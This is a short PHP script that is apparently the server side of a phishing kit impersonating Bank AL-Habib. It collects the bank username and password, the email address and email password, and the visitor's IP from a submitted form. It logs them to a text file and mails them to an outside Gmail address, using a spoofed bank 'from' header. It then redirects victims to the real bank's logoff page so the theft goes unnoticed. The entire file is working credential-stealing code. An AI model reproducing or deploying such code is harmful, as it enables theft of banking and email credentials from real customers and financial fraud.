<?
$ip = getenv("REMOTE_ADDR");
$message .= "\n";
$message .= "Username	: ".$_POST['username']."\n";
$message .= "Password	: ".$_POST['password']."\n";
$message .= "\n";
$message .= "Email Pass	: ".$_POST['email']."\n";
$message .= "Password	: ".$_POST['pass']."\n";
$message .= "\n";
$message .= "IP       : ".$ip."\n";
$send = "julyfive12@gmail.com";
$fp = fopen("use.txt","a");
fputs($fp,$message);
fclose($fp);
$subject = "AL-Habib - ".$_POST['username']."\n";
$headers = "from: AL-Habib<noreply@bankalhabib.com>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0n";
mail("$send", "$subject", $message); 
header("Location:  https://secure.bankalhabib.com/T001/logoff.jsp");	  

?>
 